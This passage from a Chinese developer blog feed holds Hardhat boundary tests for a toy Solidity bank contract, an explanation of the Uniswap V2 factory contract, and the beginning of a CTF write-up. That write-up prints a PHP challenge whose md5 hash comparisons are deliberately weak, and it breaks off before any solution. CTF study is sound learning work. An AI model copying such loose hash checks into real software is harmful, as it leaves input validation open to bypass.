<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> E:\code\solidity_project\bank3&gt; pnpm hardhat test test/Bank.test.js</span><br><span class="line">Compiled <span class="number">1</span> Solidity file successfully (evm target: unknown evm version <span class="keyword">for</span> solc version <span class="number">0.4</span>.<span class="number">20</span>).</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  Bank 合约</span><br><span class="line">    部署测试</span><br><span class="line">      ✔ 成功部署合约 (<span class="number">46</span>ms)</span><br><span class="line">    账户管理</span><br><span class="line">      ✔ 应该允许创建账户</span><br><span class="line">      ✔ 不允许重复创建账户</span><br><span class="line">    存款测试</span><br><span class="line">      ✔ 应该允许用户存款</span><br><span class="line">    取款测试</span><br><span class="line">      ✔ 应该允许用户取款</span><br><span class="line">    转账测试</span><br><span class="line">      ✔ 应该允许用户转账</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="number">6</span> passing (<span class="number">941</span>ms)</span><br></pre></td></tr></table></figure>

<p>边界值测试js脚本编写</p>
<p>我只能说 Easy</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">describe</span>(<span class="string">&quot;取款边界值测试&quot;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">       <span class="keyword">let</span> user1, user2;</span><br><span class="line">       </span><br><span class="line">       <span class="title function_">beforeEach</span>(<span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">           [user1, user2] = <span class="keyword">await</span> ethers.<span class="title function_">getSigners</span>();</span><br><span class="line">           <span class="keyword">await</span> bank.<span class="title function_">connect</span>(user1).<span class="title function_">createAccount</span>();</span><br><span class="line">           <span class="keyword">await</span> bank.<span class="title function_">connect</span>(user1).<span class="title function_">deposit</span>(&#123; <span class="attr">value</span>: <span class="number">100</span> &#125;);</span><br><span class="line">       &#125;);</span><br><span class="line"></span><br><span class="line">       <span class="comment">// 1. 测试取款金额大于0的情况</span></span><br><span class="line">       <span class="title function_">describe</span>(<span class="string">&quot;测试取款金额大于0的情况&quot;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">           <span class="title function_">it</span>(<span class="string">&quot;应该允许取款金额为1（最小值）&quot;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">               <span class="keyword">await</span> bank.<span class="title function_">connect</span>(user1).<span class="title function_">withdraw</span>(<span class="number">1</span>);</span><br><span class="line">               <span class="title function_">expect</span>(<span class="keyword">await</span> bank.<span class="title function_">connect</span>(user1).<span class="title function_">checkBalance</span>()).<span class="property">to</span>.<span class="title function_">equal</span>(<span class="number">99</span>);</span><br><span class="line">           &#125;);</span><br><span class="line"></span><br><span class="line">           <span class="title function_">it</span>(<span class="string">&quot;应该允许取款金额为余额的一半&quot;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">               <span class="keyword">await</span> bank.<span class="title function_">connect</span>(user1).<span class="title function_">withdraw</span>(<span class="number">50</span>);</span><br><span class="line">               <span class="title function_">expect</span>(<span class="keyword">await</span> bank.<span class="title function_">connect</span>(user1).<span class="title function_">checkBalance</span>()).<span class="property">to</span>.<span class="title function_">equal</span>(<span class="number">50</span>);</span><br><span class="line">           &#125;);</span><br><span class="line"></span><br><span class="line">           <span class="title function_">it</span>(<span class="string">&quot;应该允许取款金额为余额-1&quot;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">               <span class="keyword">await</span> bank.<span class="title function_">connect</span>(user1).<span class="title function_">withdraw</span>(<span class="number">99</span>);</span><br><span class="line">               <span class="title function_">expect</span>(<span class="keyword">await</span> bank.<span class="title function_">connect</span>(user1).<span class="title function_">checkBalance</span>()).<span class="property">to</span>.<span class="title function_">equal</span>(<span class="number">1</span>);</span><br><span class="line">           &#125;);</span><br><span class="line"></span><br><span class="line">           <span class="title function_">it</span>(<span class="string">&quot;应该允许取款金额等于余额&quot;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">               <span class="keyword">await</span> bank.<span class="title function_">connect</span>(user1).<span class="title function_">withdraw</span>(<span class="number">100</span>);</span><br><span class="line">               <span class="title function_">expect</span>(<span class="keyword">await</span> bank.<span class="title function_">connect</span>(user1).<span class="title function_">checkBalance</span>()).<span class="property">to</span>.<span class="title function_">equal</span>(<span class="number">0</span>);</span><br><span class="line">           &#125;);</span><br><span class="line"></span><br><span class="line">           <span class="title function_">it</span>(<span class="string">&quot;应该拒绝取款金额为0&quot;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">               <span class="keyword">await</span> <span class="title function_">expect</span>(bank.<span class="title function_">connect</span>(user1).<span class="title function_">withdraw</span>(<span class="number">0</span>))</span><br><span class="line">                   .<span class="property">to</span>.<span class="property">be</span>.<span class="property">reverted</span>;</span><br><span class="line">           &#125;);</span><br><span class="line"></span><br><span class="line">           <span class="title function_">it</span>(<span class="string">&quot;应该拒绝取款金额为负数（Solidity会自动处理）&quot;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">               <span class="comment">// uint 类型不能为负数，Solidity 会自动拒绝</span></span><br><span class="line">               <span class="comment">// 这个测试主要是验证类型安全</span></span><br><span class="line">           &#125;);</span><br><span class="line">       &#125;);</span><br><span class="line"></span><br><span class="line">       <span class="comment">// 2. 测试账户余额大于取款金额的情况</span></span><br><span class="line">       <span class="title function_">describe</span>(<span class="string">&quot;测试账户余额大于取款金额的情况&quot;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">           <span class="title function_">it</span>(<span class="string">&quot;余额100，取款50，应该成功&quot;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">               <span class="keyword">await</span> bank.<span class="title function_">connect</span>(user1).<span class="title function_">withdraw</span>(<span class="number">50</span>);</span><br><span class="line">               <span class="title function_">expect</span>(<span class="keyword">await</span> bank.<span class="title function_">connect</span>(user1).<span class="title function_">checkBalance</span>()).<span class="property">to</span>.<span class="title function_">equal</span>(<span class="number">50</span>);</span><br><span class="line">           &#125;);</span><br><span class="line"></span><br><span class="line">           <span class="title function_">it</span>(<span class="string">&quot;余额100，取款99，应该成功&quot;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">               <span class="keyword">await</span> bank.<span class="title function_">connect</span>(user1).<span class="title function_">withdraw</span>(<span class="number">99</span>);</span><br><span class="line">               <span class="title function_">expect</span>(<span class="keyword">await</span> bank.<span class="title function_">connect</span>(user1).<span class="title function_">checkBalance</span>()).<span class="property">to</span>.<span class="title function_">equal</span>(<span class="number">1</span>);</span><br><span class="line">           &#125;);</span><br><span class="line"></span><br><span class="line">           <span class="title function_">it</span>(<span class="string">&quot;余额100，取款100，应该成功&quot;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">               <span class="keyword">await</span> bank.<span class="title function_">connect</span>(user1).<span class="title function_">withdraw</span>(<span class="number">100</span>);</span><br><span class="line">               <span class="title function_">expect</span>(<span class="keyword">await</span> bank.<span class="title function_">connect</span>(user1).<span class="title function_">checkBalance</span>()).<span class="property">to</span>.<span class="title function_">equal</span>(<span class="number">0</span>);</span><br><span class="line">           &#125;);</span><br><span class="line"></span><br><span class="line">           <span class="title function_">it</span>(<span class="string">&quot;余额100，取款101，应该失败&quot;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">               <span class="keyword">await</span> <span class="title function_">expect</span>(bank.<span class="title function_">connect</span>(user1).<span class="title function_">withdraw</span>(<span class="number">101</span>))</span><br><span class="line">                   .<span class="property">to</span>.<span class="property">be</span>.<span class="property">reverted</span>;</span><br><span class="line">           &#125;);</span><br><span class="line"></span><br><span class="line">           <span class="title function_">it</span>(<span class="string">&quot;余额100，取款最大值，应该失败&quot;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">               <span class="keyword">await</span> <span class="title function_">expect</span>(bank.<span class="title function_">connect</span>(user1).<span class="title function_">withdraw</span>(<span class="number">115792089237316195423570985008687907853269984665640564039457584007913129639935n</span>))</span><br><span class="line">                   .<span class="property">to</span>.<span class="property">be</span>.<span class="property">reverted</span>;</span><br><span class="line">           &#125;);</span><br><span class="line"></span><br><span class="line">       &#125;);</span><br><span class="line"></span><br><span class="line">       <span class="comment">// 3. 测试账户存在的情况</span></span><br><span class="line">       <span class="title function_">describe</span>(<span class="string">&quot;测试账户存在的情况&quot;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">           <span class="title function_">it</span>(<span class="string">&quot;已创建账户的用户应该能取款&quot;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">               <span class="keyword">await</span> bank.<span class="title function_">connect</span>(user1).<span class="title function_">withdraw</span>(<span class="number">50</span>);</span><br><span class="line">               <span class="title function_">expect</span>(<span class="keyword">await</span> bank.<span class="title function_">connect</span>(user1).<span class="title function_">checkBalance</span>()).<span class="property">to</span>.<span class="title function_">equal</span>(<span class="number">50</span>);</span><br><span class="line">           &#125;);</span><br><span class="line"></span><br><span class="line">           <span class="title function_">it</span>(<span class="string">&quot;未创建账户的用户应该不能取款&quot;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">               <span class="keyword">await</span> <span class="title function_">expect</span>(bank.<span class="title function_">connect</span>(user2).<span class="title function_">withdraw</span>(<span class="number">50</span>))</span><br><span class="line">                   .<span class="property">to</span>.<span class="property">be</span>.<span class="property">reverted</span>;</span><br><span class="line">           &#125;);</span><br><span class="line"></span><br><span class="line">           <span class="title function_">it</span>(<span class="string">&quot;创建账户但余额为0的用户应该不能取款&quot;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">               <span class="keyword">await</span> bank.<span class="title function_">connect</span>(user2).<span class="title function_">createAccount</span>();</span><br><span class="line">               <span class="keyword">await</span> <span class="title function_">expect</span>(bank.<span class="title function_">connect</span>(user2).<span class="title function_">withdraw</span>(<span class="number">1</span>))</span><br><span class="line">                   .<span class="property">to</span>.<span class="property">be</span>.<span class="property">reverted</span>;</span><br><span class="line">           &#125;);</span><br><span class="line">       &#125;);</span><br><span class="line"></span><br><span class="line">       <span class="comment">// 4. 额外边界测试</span></span><br><span class="line">       <span class="title function_">describe</span>(<span class="string">&quot;额外边界测试&quot;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">           <span class="title function_">it</span>(<span class="string">&quot;连续多次取款&quot;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">               <span class="keyword">await</span> bank.<span class="title function_">connect</span>(user1).<span class="title function_">withdraw</span>(<span class="number">30</span>);</span><br><span class="line">               <span class="title function_">expect</span>(<span class="keyword">await</span> bank.<span class="title function_">connect</span>(user1).<span class="title function_">checkBalance</span>()).<span class="property">to</span>.<span class="title function_">equal</span>(<span class="number">70</span>);</span><br><span class="line">               </span><br><span class="line">               <span class="keyword">await</span> bank.<span class="title function_">connect</span>(user1).<span class="title function_">withdraw</span>(<span class="number">30</span>);</span><br><span class="line">               <span class="title function_">expect</span>(<span class="keyword">await</span> bank.<span class="title function_">connect</span>(user1).<span class="title function_">checkBalance</span>()).<span class="property">to</span>.<span class="title function_">equal</span>(<span class="number">40</span>);</span><br><span class="line">               </span><br><span class="line">               <span class="keyword">await</span> bank.<span class="title function_">connect</span>(user1).<span class="title function_">withdraw</span>(<span class="number">40</span>);</span><br><span class="line">               <span class="title function_">expect</span>(<span class="keyword">await</span> bank.<span class="title function_">connect</span>(user1).<span class="title function_">checkBalance</span>()).<span class="property">to</span>.<span class="title function_">equal</span>(<span class="number">0</span>);</span><br><span class="line">           &#125;);</span><br><span class="line"></span><br><span class="line">           <span class="title function_">it</span>(<span class="string">&quot;取款后再次存款再取款&quot;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">               <span class="keyword">await</span> bank.<span class="title function_">connect</span>(user1).<span class="title function_">withdraw</span>(<span class="number">50</span>);</span><br><span class="line">               <span class="title function_">expect</span>(<span class="keyword">await</span> bank.<span class="title function_">connect</span>(user1).<span class="title function_">checkBalance</span>()).<span class="property">to</span>.<span class="title function_">equal</span>(<span class="number">50</span>);</span><br><span class="line">               </span><br><span class="line">               <span class="keyword">await</span> bank.<span class="title function_">connect</span>(user1).<span class="title function_">deposit</span>(&#123; <span class="attr">value</span>: <span class="number">50</span> &#125;);</span><br><span class="line">               <span class="title function_">expect</span>(<span class="keyword">await</span> bank.<span class="title function_">connect</span>(user1).<span class="title function_">checkBalance</span>()).<span class="property">to</span>.<span class="title function_">equal</span>(<span class="number">100</span>);</span><br><span class="line">               </span><br><span class="line">               <span class="keyword">await</span> bank.<span class="title function_">connect</span>(user1).<span class="title function_">withdraw</span>(<span class="number">100</span>);</span><br><span class="line">               <span class="title function_">expect</span>(<span class="keyword">await</span> bank.<span class="title function_">connect</span>(user1).<span class="title function_">checkBalance</span>()).<span class="property">to</span>.<span class="title function_">equal</span>(<span class="number">0</span>);</span><br><span class="line">           &#125;);</span><br><span class="line"></span><br><span class="line">           <span class="title function_">it</span>(<span class="string">&quot;测试大额取款&quot;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">               <span class="comment">// 存入大额资金</span></span><br><span class="line">               <span class="keyword">await</span> bank.<span class="title function_">connect</span>(user3).<span class="title function_">createAccount</span>();</span><br><span class="line">    </span><br><span class="line">               <span class="keyword">await</span> bank.<span class="title function_">connect</span>(user3).<span class="title function_">deposit</span>(&#123; <span class="attr">value</span>: <span class="number">999997133560957503749n</span>&#125;);</span><br><span class="line">               </span><br><span class="line">               <span class="comment">// 取款大额资金</span></span><br><span class="line">               <span class="keyword">await</span> bank.<span class="title function_">connect</span>(user3).<span class="title function_">withdraw</span>(<span class="number">999997133560957503749n</span>);</span><br><span class="line">               <span class="title function_">expect</span>(<span class="keyword">await</span> bank.<span class="title function_">connect</span>(user3).<span class="title function_">checkBalance</span>()).<span class="property">to</span>.<span class="title function_">equal</span>(<span class="number">0</span>);</span><br><span class="line">           &#125;);</span><br><span class="line">       &#125;);</span><br></pre></td></tr></table></figure>

<p>测试结果</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">  取款边界值测试</span><br><span class="line">    测试取款金额大于<span class="number">0</span>的情况</span><br><span class="line">      ✔ 应该允许取款金额为<span class="number">1</span>（最小值）</span><br><span class="line">      ✔ 应该允许取款金额为余额的一半</span><br><span class="line">      ✔ 应该允许取款金额为余额<span class="literal">-1</span></span><br><span class="line">      ✔ 应该允许取款金额等于余额</span><br><span class="line">      ✔ 应该拒绝取款金额为<span class="number">0</span></span><br><span class="line">      ✔ 应该拒绝取款金额为负数（Solidity会自动处理）</span><br><span class="line">    测试账户余额大于取款金额的情况</span><br><span class="line">      ✔ 余额<span class="number">100</span>，取款<span class="number">50</span>，应该成功</span><br><span class="line">      ✔ 余额<span class="number">100</span>，取款<span class="number">99</span>，应该成功</span><br><span class="line">      ✔ 余额<span class="number">100</span>，取款<span class="number">100</span>，应该成功</span><br><span class="line">      ✔ 余额<span class="number">100</span>，取款<span class="number">101</span>，应该失败</span><br><span class="line">      ✔ 余额<span class="number">100</span>，取款最大值，应该失败</span><br><span class="line">    测试账户存在的情况</span><br><span class="line">      ✔ 已创建账户的用户应该能取款</span><br><span class="line">      ✔ 未创建账户的用户应该不能取款</span><br><span class="line">      ✔ 创建账户但余额为<span class="number">0</span>的用户应该不能取款</span><br><span class="line">    额外边界测试</span><br><span class="line">      ✔ 连续多次取款</span><br><span class="line">      ✔ 取款后再次存款再取款</span><br><span class="line">      ✔ 测试大额取款</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">23</span> passing (<span class="number">1</span>s)</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>Solidity</tag>
        <tag>Web3</tag>
      </tags>
  </entry>
  <entry>
    <title>2025-10-21-Uniswap-V2-工厂合约</title>
    <url>/2025/10/20/2025-10-21-Uniswap-V2-%E5%B7%A5%E5%8E%82%E5%90%88%E7%BA%A6/</url>
    <content><![CDATA[<h3 id="工厂合约代码及其分析"><a href="#工厂合约代码及其分析" class="headerlink" title="工厂合约代码及其分析"></a>工厂合约代码及其分析</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity =0.5.16;</span><br><span class="line"></span><br><span class="line">import &#x27;./interfaces/IUniswapV2Factory.sol&#x27;;</span><br><span class="line">import &#x27;./UniswapV2Pair.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract UniswapV2Factory is IUniswapV2Factory &#123;</span><br><span class="line">    address public feeTo;</span><br><span class="line">    address public feeToSetter;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; mapping(address =&gt; address)) public getPair;</span><br><span class="line">    address[] public allPairs;</span><br><span class="line"></span><br><span class="line">    event PairCreated(address indexed token0, address indexed token1, address pair, uint);</span><br><span class="line"></span><br><span class="line">    constructor(address _feeToSetter) public &#123;</span><br><span class="line">        feeToSetter = _feeToSetter;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function allPairsLength() external view returns (uint) &#123;</span><br><span class="line">        return allPairs.length;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function createPair(address tokenA, address tokenB) external returns (address pair) &#123;</span><br><span class="line">        require(tokenA != tokenB, &#x27;UniswapV2: IDENTICAL_ADDRESSES&#x27;);</span><br><span class="line">        (address token0, address token1) = tokenA &lt; tokenB ? (tokenA, tokenB) : (tokenB, tokenA);</span><br><span class="line">        require(token0 != address(0), &#x27;UniswapV2: ZERO_ADDRESS&#x27;);</span><br><span class="line">        require(getPair[token0][token1] == address(0), &#x27;UniswapV2: PAIR_EXISTS&#x27;); // single check is sufficient</span><br><span class="line">        bytes memory bytecode = type(UniswapV2Pair).creationCode;</span><br><span class="line">        bytes32 salt = keccak256(abi.encodePacked(token0, token1));</span><br><span class="line">        assembly &#123;</span><br><span class="line">            pair := create2(0, add(bytecode, 32), mload(bytecode), salt)</span><br><span class="line">        &#125;</span><br><span class="line">        IUniswapV2Pair(pair).initialize(token0, token1);</span><br><span class="line">        getPair[token0][token1] = pair;</span><br><span class="line">        getPair[token1][token0] = pair; // populate mapping in the reverse direction</span><br><span class="line">        allPairs.push(pair);</span><br><span class="line">        emit PairCreated(token0, token1, pair, allPairs.length);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setFeeTo(address _feeTo) external &#123;</span><br><span class="line">        require(msg.sender == feeToSetter, &#x27;UniswapV2: FORBIDDEN&#x27;);</span><br><span class="line">        feeTo = _feeTo;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setFeeToSetter(address _feeToSetter) external &#123;</span><br><span class="line">        require(msg.sender == feeToSetter, &#x27;UniswapV2: FORBIDDEN&#x27;);</span><br><span class="line">        feeToSetter = _feeToSetter;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="1-合约基础结构"><a href="#1-合约基础结构" class="headerlink" title="1. 合约基础结构"></a>1. 合约基础结构</h2><p><strong>状态变量</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">address public feeTo;          // 协议费用接收地址</span><br><span class="line"></span><br><span class="line">address public feeToSetter;    // 有权设置 feeTo 的地址</span><br><span class="line"></span><br><span class="line">mapping(address =&gt; mapping(address =&gt; address)) public getPair;  // 代币对到交易对地址的映射</span><br><span class="line"></span><br><span class="line">address[] public allPairs;     // 所有已创建交易对的数组</span><br></pre></td></tr></table></figure>

<h2 id="2-核心功能：createPair"><a href="#2-核心功能：createPair" class="headerlink" title="2. 核心功能：createPair"></a>2. 核心功能：createPair</h2><h3 id="输入验证"><a href="#输入验证" class="headerlink" title="输入验证"></a>输入验证</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">require(tokenA != tokenB, &#x27;UniswapV2: IDENTICAL_ADDRESSES&#x27;);</span><br><span class="line"></span><br><span class="line">(address token0, address token1) = tokenA &lt; tokenB ? (tokenA, tokenB) : (tokenB, tokenA);</span><br><span class="line"></span><br><span class="line">require(token0 != address(0), &#x27;UniswapV2: ZERO_ADDRESS&#x27;);</span><br><span class="line"></span><br><span class="line">require(getPair[token0][token1] == address(0), &#x27;UniswapV2: PAIR_EXISTS&#x27;);</span><br></pre></td></tr></table></figure>

<p><strong>关键设计</strong>：</p>
<ul>
<li>代币地址标准化排序（token0 &lt; token1）</li>
<li>防止重复创建相同交易对</li>
<li>零地址检查</li>
</ul>
<h3 id="CREATE2-确定性部署"><a href="#CREATE2-确定性部署" class="headerlink" title="CREATE2 确定性部署"></a>CREATE2 确定性部署</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bytes memory bytecode = type(UniswapV2Pair).creationCode;</span><br><span class="line"></span><br><span class="line">bytes32 salt = keccak256(abi.encodePacked(token0, token1));</span><br><span class="line"></span><br><span class="line">assembly &#123;</span><br><span class="line"></span><br><span class="line">    pair := create2(0, add(bytecode, 32), mload(bytecode), salt)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>CREATE2 的优势</strong>：</p>
<ul>
<li>相同代币对总是部署到相同地址</li>
<li>便于前端预测交易对地址</li>
<li>节省 Gas（避免重复部署）</li>
</ul>
<h3 id="初始化交易对"><a href="#初始化交易对" class="headerlink" title="初始化交易对"></a>初始化交易对</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IUniswapV2Pair(pair).initialize(token0, token1);</span><br></pre></td></tr></table></figure>

<h3 id="更新状态"><a href="#更新状态" class="headerlink" title="更新状态"></a>更新状态</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getPair[token0][token1] = pair;</span><br><span class="line"></span><br><span class="line">getPair[token1][token0] = pair; // 反向映射</span><br><span class="line"></span><br><span class="line">allPairs.push(pair);</span><br></pre></td></tr></table></figure>

<h2 id="3-费用管理机制"><a href="#3-费用管理机制" class="headerlink" title="3. 费用管理机制"></a>3. 费用管理机制</h2><h3 id="设置协议费用接收地址"><a href="#设置协议费用接收地址" class="headerlink" title="设置协议费用接收地址"></a>设置协议费用接收地址</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function setFeeTo(address _feeTo) external &#123;</span><br><span class="line"></span><br><span class="line">    require(msg.sender == feeToSetter, &#x27;UniswapV2: FORBIDDEN&#x27;);</span><br><span class="line"></span><br><span class="line">    feeTo = _feeTo;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="转移权限管理"><a href="#转移权限管理" class="headerlink" title="转移权限管理"></a>转移权限管理</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function setFeeToSetter(address _feeToSetter) external &#123;</span><br><span class="line"></span><br><span class="line">    require(msg.sender == feeToSetter, &#x27;UniswapV2: FORBIDDEN&#x27;);</span><br><span class="line"></span><br><span class="line">    feeToSetter = _feeToSetter;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>权限模型</strong>：</p>
<ul>
<li>只有 <code>feeToSetter</code> 可以设置 <code>feeTo</code></li>
<li><code>feeToSetter</code> 可以将权限转移给其他地址</li>
</ul>
<h2 id="4-查询功能"><a href="#4-查询功能" class="headerlink" title="4. 查询功能"></a>4. 查询功能</h2><h3 id="获取交易对数量"><a href="#获取交易对数量" class="headerlink" title="获取交易对数量"></a>获取交易对数量</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function allPairsLength() external view returns (uint) &#123;</span><br><span class="line"></span><br><span class="line">    return allPairs.length;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="通过代币地址查询交易对"><a href="#通过代币地址查询交易对" class="headerlink" title="通过代币地址查询交易对"></a>通过代币地址查询交易对</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 通过 public mapping 自动生成查询函数</span><br><span class="line"></span><br><span class="line">getPair[token0][token1]  // 返回交易对地址</span><br></pre></td></tr></table></figure>

<h2 id="5-核心设计特点"><a href="#5-核心设计特点" class="headerlink" title="5. 核心设计特点"></a>5. 核心设计特点</h2><h3 id="确定性地址计算"><a href="#确定性地址计算" class="headerlink" title="确定性地址计算"></a>确定性地址计算</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 交易对地址计算公式：</span><br><span class="line"></span><br><span class="line">address = create2(0, bytecode, salt)</span><br><span class="line"></span><br><span class="line">salt = keccak256(abi.encodePacked(token0, token1))</span><br></pre></td></tr></table></figure>

<h3 id="双向映射支持"><a href="#双向映射支持" class="headerlink" title="双向映射支持"></a>双向映射支持</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getPair[token0][token1] = pair;</span><br><span class="line"></span><br><span class="line">getPair[token1][token0] = pair; // 支持反向查询</span><br></pre></td></tr></table></figure>

<h3 id="最小权限原则"><a href="#最小权限原则" class="headerlink" title="最小权限原则"></a>最小权限原则</h3><ul>
<li>只有工厂合约可以创建交易对</li>
<li>只有 <code>feeToSetter</code> 可以修改费用设置</li>
</ul>
<h2 id="6-与交易对合约的交互"><a href="#6-与交易对合约的交互" class="headerlink" title="6. 与交易对合约的交互"></a>6. 与交易对合约的交互</h2><p>当交易对合约需要查询费用设置时：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 在 UniswapV2Pair 的 _mintFee 函数中</span><br><span class="line"></span><br><span class="line">address feeTo = IUniswapV2Factory(factory).feeTo();</span><br></pre></td></tr></table></figure>

<h2 id="7-安全性考虑"><a href="#7-安全性考虑" class="headerlink" title="7. 安全性考虑"></a>7. 安全性考虑</h2><p><strong>重放攻击防护</strong>：通过映射检查确保每个交易对只创建一次</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">require(getPair[token0][token1] == address(0), &#x27;UniswapV2: PAIR_EXISTS&#x27;);</span><br></pre></td></tr></table></figure>

<p><strong>权限控制</strong>：严格的权限验证防止未授权操作</p>
<p><strong>输入验证</strong>：全面的参数检查确保合约状态一致性</p>
<p>这个工厂合约是 Uniswap V2 生态系统的核心枢纽，负责管理所有交易对的创建和协议级别的费用设置。其简洁而强大的设计为整个 DEX 提供了可靠的基础设施。</p>
]]></content>
      <tags>
        <tag>Solidity</tag>
        <tag>Web3</tag>
      </tags>
  </entry>
  <entry>
    <title>2025-10-24-web2_hash_WP</title>
    <url>/2025/10/24/2025-10-24-web2-hash-WP/</url>
    <content><![CDATA[<h3 id="web2-hash"><a href="#web2-hash" class="headerlink" title="web2-hash"></a>web2-hash</h3><p>据说出自 2020年2月安恒月赛</p>
<p>本文参考 Extrader 大佬的博客 https:&#x2F;&#x2F;www.extrader.top&#x2F;posts&#x2F;5d485480&#x2F;</p>
<p>题目是白盒</p>
<p>代码呈上</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$val1</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;val1&#x27;</span>];</span><br><span class="line"><span class="variable">$val2</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;val2&#x27;</span>];</span><br><span class="line"><span class="variable">$val3</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;val3&#x27;</span>];</span><br><span class="line"><span class="variable">$val4</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;val4&#x27;</span>];</span><br><span class="line"><span class="variable">$val5</span> = (<span class="keyword">string</span>)@<span class="variable">$_POST</span>[<span class="string">&#x27;val5&#x27;</span>];</span><br><span class="line"><span class="variable">$val6</span> = (<span class="keyword">string</span>)@<span class="variable">$_POST</span>[<span class="string">&#x27;val6&#x27;</span>];</span><br><span class="line"><span class="variable">$val7</span> = (<span class="keyword">string</span>)@<span class="variable">$_POST</span>[<span class="string">&#x27;val7&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$val1</span> == <span class="variable">$val2</span> )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;val1 OR val2 no no no&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">md5</span>(<span class="variable">$val1</span>) != <span class="title function_ invoke__">md5</span>(<span class="variable">$val2</span>) )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;step 1 fail&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$val3</span> == <span class="variable">$val4</span> )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;val3 OR val4 no no no&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( <span class="title function_ invoke__">md5</span>(<span class="variable">$val3</span>) !== <span class="title function_ invoke__">md5</span>(<span class="variable">$val4</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;step 2 